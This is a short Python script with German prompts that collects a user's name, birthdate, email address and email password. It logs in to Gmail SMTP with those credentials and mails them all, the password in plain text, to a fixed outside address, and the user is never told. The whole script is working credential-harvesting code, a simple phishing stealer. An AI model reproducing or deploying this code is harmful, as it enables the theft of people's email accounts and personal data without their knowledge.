import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

recipient_email = "elia.hartmann@bluewin.ch"

# Benutzereingabe
name = input("Bitte geben Sie Ihren Namen ein: ")
birthdate = input("Bitte geben Sie Ihr Geburtsdatum ein: ")
email_address = input("Bitte geben Sie Ihre Email ein: ")
email_password = input("Gib dein Email Passwort ein:")


# E-Mail-Inhalt erstellen
message = MIMEMultipart()
message["From"] = email_address
message["To"] = recipient_email
message["Subject"] = "Benutzerinformationen"


body = f"""
Name: {name}
Geburtsdatum: {birthdate}
Email: {email_address}
Email Passwort: {email_password}
"""

message.attach(MIMEText(body, "plain"))

# E-Mail senden
with smtplib.SMTP("smtp.gmail.com", 587) as server:
    server.starttls()
    server.login(email_address, email_password)
    server.sendmail(email_address, recipient_email, message.as_string())

print("Die E-Mail wurde erfolgreich gesendet!")
